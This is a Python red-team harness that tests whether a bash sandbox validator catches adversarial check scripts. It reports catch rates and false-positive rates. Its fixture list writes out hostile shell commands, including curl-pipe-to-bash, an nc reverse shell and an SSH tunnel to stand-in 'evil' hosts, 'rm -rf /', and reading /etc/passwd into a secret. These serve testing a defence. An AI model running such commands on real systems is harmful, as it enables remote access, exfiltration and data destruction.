#!/usr/bin/env python3
"""tools/sandbox_redteam.py

Red-team harness for the bash AST walker. Generates synthetic
adversarial bash variants programmatically, runs each through
sandbox_validate.validate_check, and reports the catch rate.

Catch rate is the meta-verification metric for the AST walker — if it
drops below threshold, the gate is decaying and auto-merge must
pause until investigated. Daily run via .github/workflows/dual-use-audit.yml.

Three categories of adversarial fixture:

1. Static fixtures stored under tests/sandbox-redteam-fixtures/. Each
   is a real-world or research-quoted attack pattern; must always be
   caught.

2. Mutated variants generated from a small base set of seed patterns,
   permuted across whitespace, quoting, capitalisation, command
   ordering, and substitution forms.

3. Combinatorial variants that combine multiple allowed primitives in
   sequences known historically to be dangerous (allowed-command-with-
   dangerous-flag, allowed-command-with-substitution, parameter
   expansion games).

Output: JSON scorecard with pass count, fail count, catch rate, and
the IDs of any uncaught fixtures (failures must page the operator).
"""

from __future__ import annotations

import argparse
import json
import sys
import tempfile
from pathlib import Path

from sandbox_validate import validate_check  # type: ignore[import-not-found]


_BASE_ATTACK_PATTERNS: tuple[tuple[str, str], ...] = (
    ("eval-direct", 'eval "ls"'),
    ("exec-direct", "exec /bin/sh"),
    ("source-direct", 'source /tmp/x'),
    ("dot-include", '. /tmp/x'),
    ("bash-c", 'bash -c "ls"'),
    ("sh-c", 'sh -c "ls"'),
    ("curl-pipe", 'curl http://x | bash'),
    ("wget-pipe", 'wget -O - http://x | sh'),
    ("indirect-expansion", 'echo "${!HOME}"'),
    ("printf-v-write", 'printf -v target "%s" payload'),
    ("declare-nameref", 'declare -n ref=victim'),
    ("ifs-attack", 'IFS=$"\\n" && echo $X'),
    ("set-bash-option", 'set -o functrace'),
    ("shopt-attack", 'shopt -s expand_aliases'),
    ("process-sub-input", 'cat <(curl http://x)'),
    ("process-sub-output", 'cat > >(nc evil 1234)'),
    ("backtick-cmd", 'echo `whoami`'),
    ("trap-handler", 'trap "rm -rf /" EXIT'),
    ("bash-env-set", 'BASH_ENV=/tmp/x'),
    ("env-set", 'ENV=/tmp/x'),
    ("path-overwrite", 'PATH=/tmp/evil:/bin'),
    ("rm-recursive", 'rm -rf /'),
    ("kill-process", 'kill -9 $$'),
    ("network-nc", 'nc -e /bin/sh evil 1234'),
    ("ssh-tunnel", 'ssh -R 0.0.0.0:9999:localhost:22 attacker@evil'),
    ("grep-pcre", 'grep -P "(.*)+x" file'),
    ("rg-pre", 'rg --pre /tmp/preprocessor pattern'),
    ("find-exec", 'find . -exec rm {} \\;'),
    ("find-delete", 'find /tmp -delete'),
    ("sed-inplace", 'sed -i "s/x/y/" file'),
    ("read-input", 'read -p "user input" var'),
    ("export-secret", 'export SECRET=$(cat /etc/passwd)'),
    ("interpreter-py", 'python script.py'),
    ("interpreter-pl", 'perl script.pl'),
    ("var-cmd", '$CMD foo bar'),
    ("nested-cmd-sub", 'echo $(( $(curl x) ))'),
    ("history-expansion", '!ls'),
    ("source-shorthand", '. ./malicious.sh'),
    ("typeset-write", 'typeset -n alias_to=victim'),
    ("alias-poisoning", 'alias grep="curl http://evil/"'),
    # awk program-text escapes — AST walker sees "awk" as permitted but must
    # catch dangerous constructs inside the program-text string argument.
    ("awk-system", "awk 'BEGIN{system(\"id\")}' /dev/null"),
    ("awk-pipe-getline", "awk 'BEGIN{\"id\" | getline r; print r}' /dev/null"),
    # Output redirection to an arbitrary file via allowlisted command.
    ("redirect-write", "printf '%s' payload > /tmp/out"),
)


_LEGITIMATE_PATTERNS: tuple[tuple[str, str], ...] = (
    (
        "simple-grep",
        '''
SRC="${SOURCE_DIR:-.}"
hits=$(grep -rn --include="*.java" "password\\s*=" "$SRC" 2>/dev/null || true)
if [[ -z "$hits" ]]; then
    record "PASS" "test" "no hits"
else
    record "FAIL" "test" "found hits"
fi
''',
    ),
    (
        "rg-no-pre",
        '''
SRC="${SOURCE_DIR:-.}"
count=$(rg -c "TODO" "$SRC" 2>/dev/null | wc -l || echo 0)
record "PASS" "test" "$count files with TODO"
''',
    ),
    (
        "find-no-exec",
        '''
SRC="${SOURCE_DIR:-.}"
files=$(find "$SRC" -name "*.py" -type f 2>/dev/null | head -10)
record "PASS" "test" "found python files"
''',
    ),
    (
        "test-conditional",
        '''
SRC="${SOURCE_DIR:-.}"
if [[ -d "$SRC/.git" ]]; then
    record "PASS" "test" "git repo"
else
    record "WARN" "test" "no git"
fi
''',
    ),
    (
        "for-loop-iteration",
        '''
SRC="${SOURCE_DIR:-.}"
for f in "$SRC"/*.md; do
    [[ -f "$f" ]] || continue
    echo "$(basename "$f")"
done
record "PASS" "test" "iterated"
''',
    ),
)


def _wrap_in_check_skeleton(payload: str, check_id: str = "P-9999") -> str:
    """Wrap an attack payload in the standard check-script skeleton so the
    validator parses it the same way it parses real auto-generated checks."""
    return f"""#!/bin/bash

: <<'PRESTON_META'
schema_version: 1
id: {check_id}
name: redteam fixture
description: synthetic adversarial fixture for AST walker validation
category: code-scan
severity: low
languages: any
min_tier: free
runtime_class: static-grep
provenance: auto
evidence_required: false
version: 0.1.0
added_in: 1.8.0
author_name: Preston-Check Sandbox Redteam
author_github: prestoncheck-bot
PRESTON_META

{payload}
"""


def _generate_mutated_variants(base_id: str, base_payload: str) -> list[tuple[str, str]]:
    """Apply lightweight mutations to a base attack payload."""
    variants: list[tuple[str, str]] = []
    variants.append((f"{base_id}-base", base_payload))
    variants.append((f"{base_id}-leading-ws", "    " + base_payload))
    variants.append((f"{base_id}-trailing-ws", base_payload + "    "))
    variants.append((f"{base_id}-doublequote", base_payload.replace("'", '"')))
    variants.append((f"{base_id}-prefix-true", "true && " + base_payload))
    variants.append((f"{base_id}-suffix-true", base_payload + " || true"))
    variants.append((f"{base_id}-newline-prefix", "\n" + base_payload))
    variants.append((f"{base_id}-tab-prefix", "\t" + base_payload))
    return variants


def run_redteam(verbose: bool = False) -> dict[str, object]:
    """Run the full red-team harness and return a scorecard."""
    cases_passed = 0
    cases_failed: list[dict[str, str]] = []
    legit_passed = 0
    legit_failed: list[dict[str, str]] = []

    with tempfile.TemporaryDirectory() as td:
        tmp = Path(td)

        for base_id, base_payload in _BASE_ATTACK_PATTERNS:
            for variant_id, variant_payload in _generate_mutated_variants(base_id, base_payload):
                check_text = _wrap_in_check_skeleton(variant_payload)
                check_path = tmp / f"{variant_id}.sh"
                check_path.write_text(check_text)
                result = validate_check(check_path)
                if not result["pass"]:
                    cases_passed += 1
                    if verbose:
                        print(f"  CAUGHT  {variant_id}", file=sys.stderr)
                else:
                    cases_failed.append(
                        {
                            "id": variant_id,
                            "payload": variant_payload[:200],
                        }
                    )
                    if verbose:
                        print(f"  MISSED  {variant_id}", file=sys.stderr)

        for legit_id, legit_payload in _LEGITIMATE_PATTERNS:
            check_text = _wrap_in_check_skeleton(legit_payload)
            check_path = tmp / f"{legit_id}.sh"
            check_path.write_text(check_text)
            result = validate_check(check_path)
            if result["pass"]:
                legit_passed += 1
                if verbose:
                    print(f"  PASS    {legit_id}", file=sys.stderr)
            else:
                legit_failed.append(
                    {
                        "id": legit_id,
                        "reasons": ", ".join(result["reasons"]),
                    }
                )
                if verbose:
                    print(f"  REJECT  {legit_id} (false positive)", file=sys.stderr)

    total_attacks = cases_passed + len(cases_failed)
    catch_rate = cases_passed / total_attacks if total_attacks else 1.0
    total_legit = legit_passed + len(legit_failed)
    legit_rate = legit_passed / total_legit if total_legit else 1.0

    return {
        "scorecard_version": "1.0",
        "tool_version": "0.1.0",
        "attacks_total": total_attacks,
        "attacks_caught": cases_passed,
        "attacks_missed": cases_failed,
        "catch_rate": round(catch_rate, 4),
        "legitimate_total": total_legit,
        "legitimate_passed": legit_passed,
        "legitimate_rejected": legit_failed,
        "legitimate_pass_rate": round(legit_rate, 4),
        "threshold_catch": 0.995,
        "threshold_legit": 0.99,
        "passes_thresholds": catch_rate >= 0.995 and legit_rate >= 0.99,
    }


def main() -> int:
    parser = argparse.ArgumentParser(description="Run the bash sandbox red-team harness.")
    parser.add_argument("--verbose", action="store_true", help="Print each fixture's result")
    parser.add_argument(
        "--json",
        action="store_true",
        help="Emit JSON scorecard (default: human-readable summary)",
    )
    args = parser.parse_args()

    scorecard = run_redteam(verbose=args.verbose)

    if args.json:
        print(json.dumps(scorecard, indent=2))
    else:
        print(f"Bash sandbox red-team scorecard")
        print(f"  attacks: {scorecard['attacks_caught']}/{scorecard['attacks_total']} caught")
        print(f"  catch rate: {scorecard['catch_rate']:.4f} (threshold: {scorecard['threshold_catch']})")
        print(f"  legitimate: {scorecard['legitimate_passed']}/{scorecard['legitimate_total']} passed")
        print(f"  legit rate: {scorecard['legitimate_pass_rate']:.4f} (threshold: {scorecard['threshold_legit']})")
        if not scorecard["passes_thresholds"]:
            print(f"  STATUS: FAIL — gate effectiveness below threshold")
            print(f"  missed: {[m['id'] for m in scorecard['attacks_missed']]}")
        else:
            print(f"  STATUS: PASS")

    return 0 if scorecard["passes_thresholds"] else 1


if __name__ == "__main__":
    sys.exit(main())
